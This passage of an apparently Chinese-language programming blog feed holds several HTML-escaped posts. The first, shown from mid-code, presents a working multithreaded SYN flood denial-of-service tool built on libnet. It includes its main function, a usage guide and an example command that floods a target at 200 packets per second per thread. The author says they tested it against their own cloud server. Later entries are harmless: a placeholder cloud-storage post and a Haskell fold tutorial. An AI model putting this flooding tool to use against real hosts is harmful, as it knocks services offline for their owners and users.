class=&quot;keyword&quot;&gt;if&lt;/span&gt; (r.tv_sec &amp;lt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				Sleep((&lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; - r.tv_usec)/&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	libnet_destroy(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;主函数&quot;&gt;&lt;a href=&quot;#主函数&quot; class=&quot;headerlink&quot; title=&quot;主函数&quot;&gt;&lt;/a&gt;主函数&lt;/h1&gt;&lt;p&gt;主函数主要处理用户输入参数并将其格式化，之后根据用户输入参数启动发送线程，线程启动间隔 1s，整个攻击默认持续 12 分钟结束，可以通过 &lt;code&gt;CTRL+C&lt;/code&gt; 结束。&lt;code&gt;getopt&lt;/code&gt; 按照 &lt;code&gt;ip.port&lt;/code&gt; 的格式对输入参数 &lt;code&gt;-t&lt;/code&gt; 做划分，例如用户指定攻击的目标 IP 为 &lt;code&gt;10.3.8.211&lt;/code&gt;，端口 80，则输入参数 &lt;code&gt;-t&lt;/code&gt; 对应 &lt;code&gt;10.3.8.211.80&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;libnet_t&lt;/span&gt; *l;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *cp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; errbuf[LIBNET_ERRBUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; c, whole_speed = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, thread_num = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;pcap_t&lt;/span&gt; *handle = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	select_adapter(&amp;amp;handle);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    l = libnet_init(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            LIBNET_RAW4,                            &lt;span class=&quot;comment&quot;&gt;/* injection type */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            name,                                   &lt;span class=&quot;comment&quot;&gt;/* network interface */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            errbuf);                                &lt;span class=&quot;comment&quot;&gt;/* error buffer */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;libnet_init() failed: %s&quot;&lt;/span&gt;, errbuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(EXIT_FAILURE); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((c = getopt(argc, argv, &lt;span class=&quot;string&quot;&gt;&quot;t:s:p:&quot;&lt;/span&gt;)) != EOF)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt; (c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;t&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!(cp = &lt;span class=&quot;built_in&quot;&gt;strrchr&lt;/span&gt;(optarg, &lt;span class=&quot;string&quot;&gt;&#39;.&#39;&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    usage(argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(EXIT_FAILURE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                *cp++ = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                dst_prt = (u_short)atoi(cp);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((dst_ip = libnet_name2addr4(l, optarg, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Bad IP address: %s\n&quot;&lt;/span&gt;, optarg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(EXIT_FAILURE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;s&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                whole_speed = atoi(optarg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;p&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                thread_num   = atoi(optarg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                usage(argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(EXIT_FAILURE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    libnet_destroy(l);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!dst_prt || !dst_ip)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        usage(argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(EXIT_FAILURE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    speed = whole_speed / thread_num;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; thread_num; i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		HANDLE handle = (HANDLE)_beginthreadex(&lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, send_syn, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (handle &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;can&#39;t create send_syn thread!\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		Sleep(&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Sleep(&lt;span class=&quot;number&quot;&gt;1200&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;运行&quot;&gt;&lt;a href=&quot;#运行&quot; class=&quot;headerlink&quot; title=&quot;运行&quot;&gt;&lt;/a&gt;运行&lt;/h1&gt;&lt;p&gt;生成程序支持三个参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-t&lt;/code&gt;：设置目标的 IP 地址和端口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-s&lt;/code&gt;：设置每个线程每秒钟发送的 SYN 数据包数量，若未指定则默认为 0，即全速发送&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;：设置同时发送 SYN 数据包的线程数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如，同时启动 4 个攻击线程，每个线程每秒发送 200 个伪造 SYN 数据包，攻击目标为 &lt;code&gt;10.3.8.211:80&lt;/code&gt;：&lt;code&gt;synFlood.exe -t 10.3.8.211.80 -s 200 -p 4&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;启动程序并开始发送后，使用 wireshark 可以捕获到伪造的 SYN 数据包，其中攻击我的 CVM 截图如下，因为 CVM 供应商提供了 DDOS 防护措施，CVM 上的 Web 服务器未收到明显影响。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xktmz.com1.z0.glb.clouddn.com/syn-flood-attack.jpg&quot; width=&quot;400px&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/20/ddos-syn-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/20/ddos-syn-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/20/ddos-syn-attack/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="OS" scheme="http://forec.github.io/tags/OS/"/>
    
      <category term="Safety" scheme="http://forec.github.io/tags/Safety/"/>
    
      <category term="线程" scheme="http://forec.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>简易云存储系统数据用户设计</title>
    <link href="http://forec.github.io/2016/11/19/cloud-storage-system-5/"/>
    <id>http://forec.github.io/2016/11/19/cloud-storage-system-5/</id>
    <published>2016-11-19T15:20:42.000Z</published>
    <updated>2016-11-20T14:49:55.272Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;介绍云存储系统中用户数据结构的设计、结构，实现用户模型框架。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;专栏目录：&lt;a href=&quot;http://blog.forec.cn/columns/cloud-storage.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;云存储系统从入门到放弃&lt;/a&gt;&lt;br&gt;此专栏的上一篇文章：&lt;a href=&quot;http://blog.forec.cn/2016/11/16/cloud-storage-system-4/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;简易云存储系统传输、认证单元测试&lt;/a&gt;&lt;br&gt;此专栏的下一篇文章：TODO&lt;/p&gt;
&lt;p&gt;原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章&lt;a href=&quot;http://blog.forec.cn/2016/11/19/cloud-storage-system-5/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原始出处&lt;/a&gt;(&lt;a href=&quot;http://blog.forec.cn/2016/11/19/cloud-storage-system-5/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.forec.cn/2016/11/19/cloud-storage-system-5/&lt;/a&gt;) 、作者信息（&lt;a href=&quot;http://forec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Forec&lt;/a&gt;）和本声明。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;介绍云存储系统中用户数据结构的设计、结构，实现用户模型框架。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://forec.github.io/categories/Code/"/>
    
    
      <category term="Golang" scheme="http://forec.github.io/tags/Golang/"/>
    
      <category term="云存储" scheme="http://forec.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"/>
    
      <category term="线程" scheme="http://forec.github.io/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Haskell 的 fold 系列</title>
    <link href="http://forec.github.io/2016/11/18/haskell-fold/"/>
    <id>http://forec.github.io/2016/11/18/haskell-fold/</id>
    <published>2016-11-18T07:10:11.000Z</published>
    <updated>2016-11-18T12:20:43.820Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;分析 Haskell 中 &lt;code&gt;fold&lt;/code&gt; 系列函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;一年前刚接触 Haskell 时，以及半年前学习 sicp 时，&lt;code&gt;fold&lt;/code&gt; 之间的转化和区别就曾让我纠结过一段时间。现在重新来看，有些概念还是模糊。所以把主要的区别记录下来以供日后查阅。&lt;/p&gt;
&lt;p&gt;相关链接： &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Fold_\(higher-order_function\&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Wikipedia上关于 fold 的解释&lt;/a&gt;)：包含了最基本的解释和形象的图示&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.haskell.org/Foldr_Foldl_Foldl&amp;#39;&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Haskell Wiki上对 fold 系列函数的解释&lt;/a&gt;：包含了对 &lt;code&gt;foldl&lt;/code&gt;、&lt;code&gt;foldr&lt;/code&gt;和&lt;code&gt;foldl&amp;#39;&lt;/code&gt; 的对比、分析，下面使用的例子即从此而来&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.haskell.org/Foldl_as_foldr&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Haskell Wiki上 foldl 和 foldr 之间的转换&lt;/a&gt;：包含了 &lt;code&gt;foldl&lt;/code&gt; 和 &lt;code&gt;foldr&lt;/code&gt; 之间转换的理解、应用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Data.Foldable&lt;/code&gt; 中的 &lt;code&gt;foldl&lt;/code&gt; 和 &lt;code&gt;foldr&lt;/code&gt; 均为非严格求值（惰性求值），最明显的差别在折叠方向不同，一个从左到右，一个从右到左。其次，&lt;code&gt;foldl&lt;/code&gt; 的形式是尾递归，而 &lt;code&gt;foldr&lt;/code&gt; 则需要在每折叠一个元素时在栈中重新开辟一块空间以进入下一层次的递归。因此 &lt;code&gt;foldl&lt;/code&gt; 较 &lt;code&gt;foldr&lt;/code&gt; 效率更高，但二者处理的列表长度均有限制（如果求值中不出现短路的情况）。&lt;/p&gt;
&lt;h1 id=&quot;无限长列表处理&quot;&gt;&lt;a href=&quot;#无限长列表处理&quot; class=&quot;headerlink&quot; title=&quot;无限长列表处理&quot;&gt;&lt;/a&gt;无限长列表处理&lt;/h1&gt;&lt;p&gt;另一个显式的不同在于，&lt;code&gt;foldr&lt;/code&gt; 能够处理无限列表，这是因为 &lt;code&gt;foldr&lt;/code&gt; 在展开过程中可能出现表达式短路，例如下面的例子中，&lt;code&gt;foldr&lt;/code&gt; 使用初值 &lt;code&gt;True&lt;/code&gt; 对一个无限长的、元素均为 &lt;code&gt;False&lt;/code&gt; 的列表求与，将立刻得到 &lt;code&gt;False&lt;/code&gt;，因为其展开式为 &lt;code&gt;a0 &amp;amp;&amp;amp; (a1 &amp;amp;&amp;amp; ( ... &amp;amp;&amp;amp; (a. &amp;amp;&amp;amp; True)))&lt;/code&gt;，虽然整个列表展开式是无穷的，但因为最外层 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 表达式的第一个操作数是 &lt;code&gt;False&lt;/code&gt;，与操作表达式短路，因此运算随之结束。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldr&lt;/span&gt; (&amp;amp;&amp;amp;) &lt;span class=&quot;type&quot;&gt;True&lt;/span&gt; (repeat &lt;span class=&quot;type&quot;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;False&lt;/span&gt; &amp;amp;&amp;amp; (&lt;span class=&quot;type&quot;&gt;False&lt;/span&gt; &amp;amp;&amp;amp; (&lt;span class=&quot;type&quot;&gt;False&lt;/span&gt; &amp;amp;&amp;amp; (... &amp;amp;&amp;amp; (&lt;span class=&quot;type&quot;&gt;False&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;type&quot;&gt;True&lt;/span&gt;) ... )))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而使用 &lt;code&gt;foldl&lt;/code&gt; 时，其展开过程如下。整个展开式无穷，而最外层的 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 表达式的第一个操作数是一个子式，也是一个无穷的展开式，要求 &lt;code&gt;foldl&lt;/code&gt; 表达式结果必须先求得子式的值，这个过程将永不会结束，也无法利用短路特性。&lt;/p&gt;
&lt;figure class=&quot;highlight haskell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;foldl&lt;/span&gt; (&amp;amp;&amp;amp;) &lt;span class=&quot;type&quot;&gt;True&lt;/span&gt; (repeat &lt;span class=&quot;type&quot;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;((...(&lt;span class=&quot;type&quot;&gt;True&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;type&quot;&gt;False&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&quot;type&quot;&gt;False&lt;/span&gt;) &amp;amp;&amp;amp; ...)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
